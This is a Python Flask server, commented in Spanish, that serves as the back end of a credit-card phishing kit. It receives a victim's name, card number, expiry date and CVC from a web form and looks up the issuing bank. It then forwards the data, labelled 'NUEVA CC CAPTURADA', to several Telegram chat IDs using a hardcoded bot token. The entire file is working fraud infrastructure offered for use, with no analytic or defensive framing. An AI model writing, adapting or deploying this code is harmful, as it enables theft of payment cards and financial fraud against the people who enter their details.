import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# AQUÍ PONES TODOS LOS QUE QUIERAS. 
# Cada vez que alguien pague, TODOS estos recibirán el mensaje.
LISTA_DE_RECEPTORES = [
    '6953415010', 
    '7707049896', 
    'OTRO_ID_1', 
    'OTRO_ID_2'
]

def get_bank_info(card_number):
    try:
        bin_number = card_number[:6]
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            bank = data.get('scheme', 'Desconocido').upper()
            type_card = data.get('type', 'Desconocido').upper()
            country = data.get('country', {}).get('name', 'Desconocido')
            bank_name = data.get('bank', {}).get('name', 'Banco Desconocido')
            return f"{bank_name} | {type_card} | {country}"
        return "Banco: Desconocido"
    except:
        return "Banco: Error al consultar"

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    # El target_id que viene del HTML se usa solo para validar que la petición es real
    target_id = str(data.get('target_id'))

    # --- VALIDACIÓN DE SEGURIDAD ---
    # Solo permitimos que el servidor trabaje si el ID que manda la página es uno de los tuyos
    if target_id not in LISTA_DE_RECEPTORES:
        print(f"🚫 Petición rechazada. ID {target_id} no está en la lista de autorizados.")
        return jsonify({"status": "ignored"}), 200

    # 1. Capturar datos
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # 2. Consultar banco automáticamente
    info_banco = get_bank_info(tarjeta)

    # 3. Preparar el mensaje
    mensaje = (
        "💰 *NUEVA CC CAPTURADA* 💰\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🏦 *INFO:* `{info_banco}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    # 4. REPARTO MASIVO: Enviamos el mensaje a TODOS los de la lista
    exitos = 0
    for receptor in LISTA_DE_RECEPTORES:
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": receptor, "text": mensaje, "parse_mode": "Markdown"}
        try:
            res = requests.post(url_telegram, json=payload)
            if res.status_code == 200:
                exitos += 1
        except:
            continue

    print(f"✅ Proceso terminado. Mensajes enviados con éxito a {exitos} personas.")
    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
